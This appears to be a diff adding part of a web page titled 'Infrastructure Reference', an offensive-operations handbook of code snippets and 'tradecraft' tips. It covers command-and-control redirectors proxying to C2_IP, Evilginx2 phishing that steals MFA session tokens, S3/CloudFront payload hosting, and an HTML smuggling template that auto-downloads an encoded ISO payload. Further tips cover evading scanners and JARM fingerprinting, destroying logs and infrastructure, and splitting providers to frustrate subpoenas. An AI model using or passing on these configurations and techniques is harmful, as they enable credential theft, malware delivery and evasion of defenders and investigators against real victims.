+{t:"Apache mod_rewrite redirector",l:"apache",c:"# /etc/apache2/sites-enabled/redirector.conf\n<VirtualHost *:443>\n    ServerName legit-domain.com\n    SSLEngine On\n    SSLCertificateFile /etc/letsencrypt/live/legit-domain.com/fullchain.pem\n    SSLCertificateKeyFile /etc/letsencrypt/live/legit-domain.com/privkey.pem\n\n    # Enable rewrite + proxy\n    RewriteEngine On\n    SSLProxyEngine On\n\n    # Block known bad User-Agents (scanners)\n    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner) [NC]\n    RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]\n\n    # Block non-target IP ranges (optional)\n    # RewriteCond %{REMOTE_ADDR} !^(10\\.0\\.)\n    # RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]\n\n    # Only forward matching URI paths to C2\n    RewriteCond %{REQUEST_URI} ^/api/v1/(status|update|config)\n    RewriteRule ^(.*)$ https://C2_IP:443$1 [P,L]\n\n    # Everything else -> legitimate decoy\n    RewriteRule ^.*$ https://www.microsoft.com/ [L,R=302]\n\n    # Proxy settings\n    ProxyPassReverse / https://C2_IP:443/\n</VirtualHost>"},
+{t:"Nginx proxy_pass redirector",l:"nginx",c:"# /etc/nginx/sites-enabled/redirector\nserver {\n    listen 443 ssl;\n    server_name legit-domain.com;\n\n    ssl_certificate /etc/letsencrypt/live/legit-domain.com/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/legit-domain.com/privkey.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n\n    # Default: redirect to decoy\n    location / {\n        return 302 https://www.microsoft.com;\n    }\n\n    # C2 matching paths -> proxy to teamserver\n    location ~ ^/api/v1/(status|update|config) {\n        # Block bad UAs\n        if ($http_user_agent ~* (curl|wget|python|scanner)) {\n            return 302 https://www.microsoft.com;\n        }\n        proxy_pass https://C2_IP:443;\n        proxy_ssl_verify off;\n        proxy_set_header Host $host;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    }\n\n    # Custom error pages (don't leak nginx version)\n    error_page 404 /404.html;\n    server_tokens off;\n}"},
+{t:"socat TCP/DNS redirector",l:"bash",c:"# Simple TCP redirector (HTTP/HTTPS)\nsocat TCP4-LISTEN:443,fork TCP4:C2_IP:443 &\n\n# UDP redirector for DNS C2\nsocat UDP4-LISTEN:53,fork UDP4:C2_IP:53 &\n\n# With IP filtering (iptables + socat):\niptables -A INPUT -p tcp --dport 443 -s TARGET_NET -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -j DROP\nsocat TCP4-LISTEN:443,fork TCP4:C2_IP:443 &\n\n# DNS redirector with iptables DNAT:\niptables -t nat -A PREROUTING -p udp --dport 53 \\\n    -j DNAT --to-destination C2_IP:53\niptables -t nat -A POSTROUTING -j MASQUERADE\necho 1 > /proc/sys/net/ipv4/ip_forward\n\n# socat with SSL termination:\nsocat OPENSSL-LISTEN:443,cert=cert.pem,key=key.pem,\\\nverify=0,fork TCP4:C2_IP:8080 &"}
+];
+C.dom=[
+{t:"Let's Encrypt cert setup",l:"bash",c:"# Install certbot\napt install -y certbot python3-certbot-nginx\n\n# Obtain certificate (HTTP validation)\ncertbot certonly --standalone -d legit-domain.com \\\n    --non-interactive --agree-tos -m fake@email.com\n\n# Or with Nginx plugin:\ncertbot --nginx -d legit-domain.com\n\n# Auto-renewal (crontab)\n0 0 1 * * certbot renew --quiet --post-hook 'systemctl reload nginx'\n\n# Wildcard cert (DNS validation):\ncertbot certonly --manual --preferred-challenges dns \\\n    -d '*.legit-domain.com' -d legit-domain.com\n# Add TXT record: _acme-challenge.legit-domain.com\n\n# Certificate files:\n# /etc/letsencrypt/live/legit-domain.com/fullchain.pem\n# /etc/letsencrypt/live/legit-domain.com/privkey.pem"},
+{t:"Domain categorization submission",l:"bash",c:"# Check categorization across vendors:\n# Manual checks:\n# - https://sitereview.bluecoat.com/\n# - https://www.trustedsource.org/\n# - https://urlfiltering.paloaltonetworks.com/\n# - https://fortiguard.com/webfilter\n# - https://urlcat.checkpoint.com/urlcat/\n\n# Before submission, host legit-looking content:\n# Healthcare: medical blog template\n# Business: corporate landing page\n# Technology: tech news aggregator\n\n# Clone a template:\nwget -m -p -E -k https://template-site.com/\n# Customize and deploy to domain\n\n# Submit for categorization:\n# Most vendors have web forms\n# Some accept automated submissions\n# Re-check after 24-48 hours\n\n# Maintain categorization:\n# Keep legit content active\n# Don't change DNS too frequently before go-time\n# robots.txt: allow crawling by categorization bots"}
+];
+C.phi=[
+{t:"GoPhish + Postfix setup",l:"bash",c:"# Install GoPhish\nwget https://github.com/gophish/gophish/releases/latest/...\nunzip gophish*.zip && cd gophish\n\n# Edit config.json:\n# admin_server: 127.0.0.1:3333 (local only)\n# phish_server: 0.0.0.0:443\n# contact_address: admin@yourdomain.com\n\n# Install Postfix as relay\napt install -y postfix opendkim opendkim-tools\n# Config: Internet Site, domain = yourdomain.com\n\n# SPF record:\n# v=spf1 ip4:MAIL_SERVER_IP ~all\n\n# DKIM setup:\nmkdir -p /etc/opendkim/keys/yourdomain.com\nopendkim-genkey -b 2048 -d yourdomain.com -s mail\nmv mail.private /etc/opendkim/keys/yourdomain.com/\n# Add DNS TXT: mail._domainkey.yourdomain.com -> key\n\n# DMARC record:\n# _dmarc.yourdomain.com TXT \"v=DMARC1; p=none\"\n\n# PTR record: MAIL_SERVER_IP -> mail.yourdomain.com\n# (Request from VPS provider)\n\n# Test: mail-tester.com (aim for 9+/10)"},
+{t:"Evilginx2 reverse proxy phishing",l:"bash",c:"# Install Evilginx2\napt install -y golang\ngit clone https://github.com/kgretzky/evilginx2\ncd evilginx2 && make\n\n# Run:\nsudo ./evilginx2 -p phishlets/\n\n# Configure:\nconfig domain yourdomain.com\nconfig ipv4 YOUR_IP\n\n# Set up phishlet (e.g., O365):\nphishlets hostname o365 login.yourdomain.com\nphishlets enable o365\n\n# Create lure:\nlures create o365\nlures edit 0 redirect_url https://real-office.com\nlures get-url 0\n# -> https://login.yourdomain.com/randompath\n\n# Evilginx acts as transparent reverse proxy:\n# Victim -> Evilginx -> Real O365\n# Captures session tokens (bypasses MFA!)\n# Tokens stored: sessions list\n\n# Required DNS:\n# login.yourdomain.com -> YOUR_IP\n# www.yourdomain.com -> YOUR_IP"}
+];
+C.pld=[
+{t:"AWS S3 + CloudFront payload hosting",l:"bash",c:"# Create S3 bucket (private)\naws s3 mb s3://random-bucket-name-2025\n\n# Upload payload\naws s3 cp payload.hta s3://random-bucket-name-2025/\n\n# Create CloudFront distribution\naws cloudfront create-distribution \\\n    --origin-domain-name random-bucket-name-2025.s3.amazonaws.com \\\n    --default-root-object index.html\n\n# Pre-signed URL (expires in 1 hour):\naws s3 presign s3://random-bucket-name-2025/payload.hta \\\n    --expires-in 3600\n# -> https://random-bucket.s3.amazonaws.com/payload.hta?X-Amz-...\n\n# CloudFront URL:\n# https://d1234567.cloudfront.net/payload.hta\n# Target sees CloudFront IP (trusted Amazon range)\n# Firewall cannot block without blocking all CloudFront\n\n# Custom domain on CloudFront:\n# CNAME: files.your-categorized-domain.com -> d1234567.cloudfront.net\n# ACM certificate for your domain"},
+{t:"HTML smuggling payload delivery",l:"html",c:"// HTML smuggling template:\n// Embed in an .html file served to target\n\n// 1. XOR-encode payload bytes with key\nvar key = 0x42;\nvar enc = [0x2c,0x32,0x71,...]; // XOR'd shellcode/ISO\n\n// 2. Decode at runtime in browser\nvar dec = new Uint8Array(enc.length);\nfor (var i = 0; i < enc.length; i++) {\n    dec[i] = enc[i] ^ key;\n}\n\n// 3. Create blob and auto-download\nvar blob = new Blob([dec],\n    {type: 'application/octet-stream'});\nvar url = URL.createObjectURL(blob);\nvar a = document.createElement('a');\na.href = url;\na.download = 'Report_Q4_2025.iso';\na.click();\n\n// 4. Redirect to decoy page\nsetTimeout(function() {\n    window.location = 'https://real-sharepoint-url.com';\n}, 1500);\n\n// Key points:\n// - Proxy sees HTML/JS download, not binary\n// - Payload reconstructed entirely client-side\n// - Network inspection tools see nothing malicious\n// - Works with ISO, VHD, EXE, DLL payloads"}
+];
+C.arc=[
+{t:"Full infrastructure iptables hardening",l:"bash",c:"#!/bin/bash\n# C2 server firewall rules\n\n# Flush existing\niptables -F\niptables -X\n\n# Default deny\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n\n# Allow loopback\niptables -A INPUT -i lo -j ACCEPT\n\n# Allow established connections\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# SSH from jump box only\niptables -A INPUT -p tcp --dport 2222 -s JUMPBOX_IP -j ACCEPT\n\n# C2 from redirectors only\niptables -A INPUT -p tcp --dport 443 -s REDIR1_IP -j ACCEPT\niptables -A INPUT -p tcp --dport 443 -s REDIR2_IP -j ACCEPT\n\n# DNS C2 from DNS redirector only\niptables -A INPUT -p udp --dport 53 -s DNS_REDIR_IP -j ACCEPT\n\n# Block ICMP\niptables -A INPUT -p icmp -j DROP\n\n# Log dropped\niptables -A INPUT -j LOG --log-prefix 'IPT_DROP: '\n\n# Save\niptables-save > /etc/iptables/rules.v4"}
+];
+C.aut=[
+{t:"Terraform: deploy redirector VPS",l:"hcl",c:"# main.tf - Deploy redirector on DigitalOcean\nterraform {\n  required_providers {\n    digitalocean = {\n      source  = \"digitalocean/digitalocean\"\n      version = \"~> 2.0\"\n    }\n  }\n}\n\nvariable \"do_token\" { sensitive = true }\nvariable \"ssh_key_fingerprint\" {}\nvariable \"c2_ip\" {}\nvariable \"domain\" {}\n\nprovider \"digitalocean\" { token = var.do_token }\n\nresource \"digitalocean_droplet\" \"redirector\" {\n  image    = \"ubuntu-22-04-x64\"\n  name     = \"web-prod-01\"  # Innocuous name\n  region   = \"nyc1\"\n  size     = \"s-1vcpu-1gb\"\n  ssh_keys = [var.ssh_key_fingerprint]\n\n  user_data = templatefile(\"cloud-init.yml\", {\n    c2_ip  = var.c2_ip\n    domain = var.domain\n  })\n}\n\nresource \"digitalocean_domain\" \"redir_domain\" {\n  name       = var.domain\n  ip_address = digitalocean_droplet.redirector.ipv4_address\n}\n\nresource \"digitalocean_firewall\" \"redir_fw\" {\n  name = \"redir-fw\"\n  droplet_ids = [digitalocean_droplet.redirector.id]\n  inbound_rule {\n    protocol         = \"tcp\"\n    port_range       = \"443\"\n    source_addresses = [\"0.0.0.0/0\"]\n  }\n  inbound_rule {\n    protocol         = \"tcp\"\n    port_range       = \"22\"\n    source_addresses = [\"JUMPBOX_IP/32\"]\n  }\n}"},
+{t:"Ansible playbook: redirector config",l:"yaml",c:"# playbooks/redirector.yml\n---\n- hosts: redirectors\n  become: yes\n  vars_files:\n    - vault.yml  # Encrypted secrets\n  tasks:\n    - name: Install packages\n      apt:\n        name: [nginx, certbot, python3-certbot-nginx]\n        state: present\n        update_cache: yes\n\n    - name: Deploy Nginx config\n      template:\n        src: templates/nginx-redirector.j2\n        dest: /etc/nginx/sites-enabled/redirector\n      notify: reload nginx\n\n    - name: Obtain Let's Encrypt cert\n      command: >\n        certbot certonly --nginx\n        -d {{ domain }}\n        --non-interactive --agree-tos\n        -m {{ cert_email }}\n      args:\n        creates: /etc/letsencrypt/live/{{ domain }}/\n\n    - name: Harden SSH\n      lineinfile:\n        path: /etc/ssh/sshd_config\n        regexp: \"{{ item.regexp }}\"\n        line: \"{{ item.line }}\"\n      loop:\n        - {regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication no'}\n        - {regexp: '^#?PermitRootLogin', line: 'PermitRootLogin no'}\n      notify: restart sshd\n\n  handlers:\n    - name: reload nginx\n      service: name=nginx state=reloaded\n    - name: restart sshd\n      service: name=sshd state=restarted"},
+{t:"Teardown script",l:"bash",c:"#!/bin/bash\n# rapid-teardown.sh - Destroy all infrastructure\nset -e\n\necho '[*] Starting infrastructure teardown...'\n\n# Phase 1: Kill active sessions\necho '[*] Disconnecting active C2 sessions...'\n# Signal implants to self-destruct (if supported)\n# sleep to allow final commands\nsleep 10\n\n# Phase 2: Destroy redirectors first (public-facing)\necho '[*] Destroying redirectors...'\ncd terraform/redirectors && terraform destroy -auto-approve\n\n# Phase 3: Destroy phishing infra\necho '[*] Destroying phishing infrastructure...'\ncd ../phishing && terraform destroy -auto-approve\n\n# Phase 4: Backup C2 data (encrypted)\necho '[*] Backing up C2 logs...'\nssh -J jump c2 'tar czf - /opt/c2/logs/' | \\\n    gpg --encrypt -r operator > c2_logs_$(date +%Y%m%d).tar.gz.gpg\n\n# Phase 5: Destroy C2\necho '[*] Destroying C2 server...'\ncd ../c2 && terraform destroy -auto-approve\n\n# Phase 6: Destroy jump box\necho '[*] Destroying jump box...'\ncd ../jumpbox && terraform destroy -auto-approve\n\n# Phase 7: Cleanup local\necho '[*] Cleaning local artifacts...'\nrm -rf terraform/*/terraform.tfstate*\nrm -rf terraform/*/.terraform\nrm -f ssh_keys/*\n\necho '[+] Teardown complete.'"}
+];
+C.kit=[
+{t:"Provider abuse-check before deploy",l:"bash",c:"# Check if VPS IP is already burned\n# Run after provisioning, BEFORE deploying C2\n\nIP=\"YOUR_NEW_VPS_IP\"\n\necho \"[*] Checking IP reputation: $IP\"\n\n# AbuseIPDB\ncurl -s \"https://api.abuseipdb.com/api/v2/check?ipAddress=$IP\" \\\n    -H 'Key: YOUR_API_KEY' -H 'Accept: application/json' \\\n    | python3 -m json.tool | grep -E 'abuse|score'\n\n# VirusTotal\ncurl -s \"https://www.virustotal.com/api/v3/ip_addresses/$IP\" \\\n    -H 'x-apikey: YOUR_KEY' \\\n    | python3 -m json.tool | grep -E 'malicious|harmless'\n\n# Reverse DNS check\ndig +short -x $IP\n# Should not resolve to known-bad or previous tenant\n\n# Shodan check (if IP already indexed)\ncurl -s \"https://api.shodan.io/shodan/host/$IP?key=YOUR_KEY\" \\\n    | python3 -m json.tool | grep -E 'port|product'\n# If ports already indexed -> previous tenant artifacts\n\n# JARM fingerprint of C2 (after setup)\n# python3 jarm.py $IP\n# Compare against known C2 JARM signatures"}
+];
+C.byp=[
+{t:"JARM fingerprint modification",l:"bash",c:"# Default Cobalt Strike JARM is well-known:\n# 07d14d16d21d21d07c42d41d00041d...\n# Scanners like Shodan flag this automatically\n\n# Fix: put Nginx/Apache in front of C2\n# Nginx terminates TLS -> changes JARM to Nginx's\n\n# Nginx reverse proxy in front of C2:\nserver {\n    listen 443 ssl;\n    server_name your-domain.com;\n    ssl_certificate /etc/letsencrypt/live/.../fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/.../privkey.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers HIGH:!aNULL:!MD5;\n\n    location / {\n        proxy_pass https://127.0.0.1:8443;  # C2 internal\n        proxy_ssl_verify off;\n    }\n}\n\n# Now JARM = Nginx, not Cobalt Strike\n# Verify: python3 jarm.py your-domain.com\n\n# Further: customize TLS ciphers to match\n# specific web server (IIS, Apache, etc.)\n# ssl_ciphers to match target environment"},
+{t:"Block scanner IP ranges",l:"bash",c:"#!/bin/bash\n# Block known scanners from probing C2/redirectors\n# Run on redirectors and C2\n\n# Shodan\nfor ip in 66.240.192.0/18 198.20.64.0/18 71.6.128.0/17; do\n    iptables -A INPUT -s $ip -j DROP\ndone\n\n# Censys\nfor ip in 162.142.125.0/24 167.248.133.0/24 167.94.138.0/24; do\n    iptables -A INPUT -s $ip -j DROP\ndone\n\n# BinaryEdge\nfor ip in 193.163.125.0/24; do\n    iptables -A INPUT -s $ip -j DROP\ndone\n\n# ZoomEye\nfor ip in 122.228.19.0/24 182.92.185.0/24; do\n    iptables -A INPUT -s $ip -j DROP\ndone\n\n# GreyNoise (benign but still indexing)\n# Check: https://viz.greynoise.io/\n\n# Also block via User-Agent on web server:\n# Nginx:\n# if ($http_user_agent ~* (Shodan|Censys|masscan)) {\n#     return 444;\n# }\n\niptables-save > /etc/iptables/rules.v4"}
+];
+return C[s]||[];
+}
+var TR={
+c2s:[
+{t:"Bind C2 to localhost, always",d:"Never expose C2 management ports (50050, 7443, etc.) to the internet. Bind to 127.0.0.1 and access exclusively through SSH tunnels from your jump box."},
+{t:"Separate long-haul from short-haul",d:"Long-haul C2 uses different infrastructure than interactive/short-haul. If short-haul gets burned, long-haul survives. Different domains, IPs, and profiles."},
+{t:"Disable all logging on C2 server",d:"unset HISTFILE, symlink .bash_history to /dev/null, minimize syslog. The less forensic evidence on the C2, the better if it's ever seized."},
+{t:"Non-standard SSH ports with key-only",d:"Change SSH to random high port (50000+). Key-only auth. AllowUsers directive. fail2ban. This stops automated scanning and brute-force."}
+],
+rdr:[
+{t:"Redirectors are disposable, C2 is not",d:"Plan for redirector takedown or burn. Pre-stage replacements. Update DNS (low TTL). Implants should have fallback domains that point to backup redirectors."},
+{t:"Filter on multiple criteria",d:"Don't just filter on URI path. Combine: User-Agent + URI + source IP range + time of day + HTTP headers. Multi-factor filtering catches researchers and sandboxes."},
+{t:"Redirect invalid traffic to real site",d:"Don't return 403/404 to invalid requests. 302 redirect to Microsoft, Google, or the target's own website. Looks like a normal redirect, not a suspicious server."},
+{t:"Use HTTPS between redirector and C2",d:"Even internal redirector-to-C2 traffic should be encrypted. If the redirector is compromised, traffic capture shouldn't reveal C2 comms content."}
+],
+dom:[
+{t:"Aged domains are worth the investment",d:"A 6-month-old domain with categorization and clean history passes more security controls than any evasion technique. Budget time and money for domain aging."},
+{t:"Certificate Transparency reveals you",d:"Every Let's Encrypt cert is logged in CT logs (crt.sh). Blue teams monitor CT for domains similar to theirs. Use wildcard certs to minimize entries."},
+{t:"Match domain to target industry",d:"Healthcare target? Use a health-categorized domain. Finance target? Business category. The proxy categorization check passes when domain matches expected traffic."},
+{t:"Separate registrar from DNS provider",d:"If your DNS provider (CloudFlare) gets a takedown, your registrar still holds the domain. You can point DNS elsewhere. Redundancy in every layer."}
+],
+phi:[
+{t:"SPF + DKIM + DMARC + PTR = inbox",d:"Missing any one of these four will likely land you in spam. PTR record is often overlooked \u2014 request from your VPS provider. Test with mail-tester.com before sending."},
+{t:"Warm up sending IP gradually",d:"Don't blast 1000 emails from a fresh IP. Send 10-20 per day for the first week, gradually increase. Sudden volume from new IP = spam flag."},
+{t:"Evilginx2 captures MFA tokens",d:"Evilginx acts as a transparent reverse proxy to the real login page. It captures session cookies/tokens after MFA completion, bypassing 2FA entirely."},
+{t:"Phishing infra is always disposable",d:"Expect phishing domains and IPs to be reported within hours. Have backup infrastructure ready. Never share phishing infra with C2 \u2014 it will burn."}
+],
+pld:[
+{t:"Pre-signed URLs auto-expire",d:"AWS S3 pre-signed URLs expire after configurable time (1 hour default). Payload only accessible during the delivery window. No persistent hosting to discover."},
+{t:"CDN IPs cannot be blocked",d:"CloudFront, Azure CDN, etc. share IP ranges with millions of legitimate sites. Blocking the CDN IP blocks half the internet. Your payload rides on trusted infrastructure."},
+{t:"HTML smuggling bypasses proxies",d:"Proxy sees an HTML page download, not a binary. The payload is reconstructed client-side from encoded data. Network inspection tools see HTML/JavaScript, nothing malicious."},
+{t:"One-time download links",d:"Serve the payload once, then return 404 for subsequent requests (track by IP or token). Prevents re-analysis. IR team gets 404 when they try to retrieve the payload."}
+],
+arc:[
+{t:"Never connect directly from personal IP",d:"Always go through VPN + jump box. Your personal IP should never appear in any server logs, SSH auth logs, or network captures anywhere in the infrastructure."},
+{t:"Different providers per tier",d:"C2 on DigitalOcean, redirectors on Vultr, jump box on AWS, phishing on Hetzner. Single provider compromise or subpoena doesn't expose entire operation."},
+{t:"Pre-stage replacement infrastructure",d:"Have warm standby redirectors and domains ready to activate. When current infra is burned, rotate in replacements without rebuilding from scratch."},
+{t:"Kill switches on every layer",d:"Each component should be independently destroyable. terraform destroy per module. Don't let one component depend on another for teardown."}
+],
+aut:[
+{t:"Terraform state files are sensitive",d:"State files contain IPs, credentials, and infrastructure details. Encrypt at rest, never commit to git. Use remote state with encryption (S3 + KMS) or local encrypted."},
+{t:"Packer images save minutes",d:"Pre-built VM images with C2, tools, and configs already installed deploy in seconds vs. minutes of apt-get and configuration. Worth the upfront investment."},
+{t:"Ansible vault for all secrets",d:"Never hardcode C2 IPs, passwords, or keys in playbooks. Use Ansible Vault encryption. Different vault passwords per engagement."},
+{t:"Test entire deployment before engagement",d:"Spin up full infra, run through the kill chain, tear down. Catch configuration issues before they cause operational problems. Automate this as a CI/CD pipeline."}
+],
+kit:[
+{t:"Check IP reputation before deploying anything",d:"Fresh VPS IPs may be burned from previous tenants. Check AbuseIPDB, VirusTotal, Shodan. If already flagged, destroy and provision a new one."},
+{t:"Innocuous hostnames and server banners",d:"Name VPS instances 'web-prod-01' not 'c2-server'. Default Nginx/Apache error pages, not custom. Don't advertise what the server actually does."},
+{t:"Budget for multiple domains per engagement",d:"Minimum 3-4 domains: primary C2, backup C2, phishing, payload hosting. Each categorized. At ~$15/domain + aging time, plan ahead."},
+{t:"Document everything for deconfliction",d:"Record all IPs, domains, and timeframes used. If another team or law enforcement encounters your infra, deconfliction records prevent misattribution."}
+],
+byp:[
+{t:"JARM fingerprinting catches default C2",d:"Shodan and other scanners fingerprint TLS implementations. Default Cobalt Strike, Sliver, and Mythic have known JARM signatures. Always put Nginx/Apache in front."},
+{t:"Residential proxies for highest trust",d:"Cloud IPs are increasingly flagged. Residential proxy services (Bright Data, etc.) route through real ISP IPs. Expensive but highest trust score."},
+{t:"CT log monitoring works both ways",d:"Blue teams watch CT logs for lookalike domains. You should also monitor CT for your operational domains being investigated. crt.sh RSS feeds."},
+{t:"Domain fronting still works on some CDNs",d:"While Azure and AWS blocked it, some smaller CDNs still allow different Host headers. Test current CDN policies. Custom CNAME setups sometimes work."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='c2s')flow=fC2S();else if(S.s==='rdr')flow=fRDR();else if(S.s==='dom')flow=fDOM();
+else if(S.s==='phi')flow=fPHI();else if(S.s==='pld')flow=fPLD();else if(S.s==='arc')flow=fARC();
+else if(S.s==='aut')flow=fAUT();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+var thtml=tricks.length===0?'':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT & TIPS</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Infrastructure Reference</h1><div class="sub">C2 Servers \u2022 Redirectors \u2022 Domains \u2022 Phishing \u2022 Payload Hosting \u2022 Architecture \u2022 Automation \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"C2 Servers"},{c:"#60a5fa",l:"Redirectors"},{c:"#a78bfa",l:"Domains"},{c:"#fbbf24",l:"Phishing"},{c:"#34d399",l:"Payload Host"},{c:"#f59e0b",l:"Architecture"},{c:"#e879f9",l:"Automation"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//');
+if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
+if(line.trimStart().charAt(0)==='#')return'<span class="pp">'+esc(line)+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);};
+});
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);};
+});
+}
+render();
+</script>
+</body>
+</html>
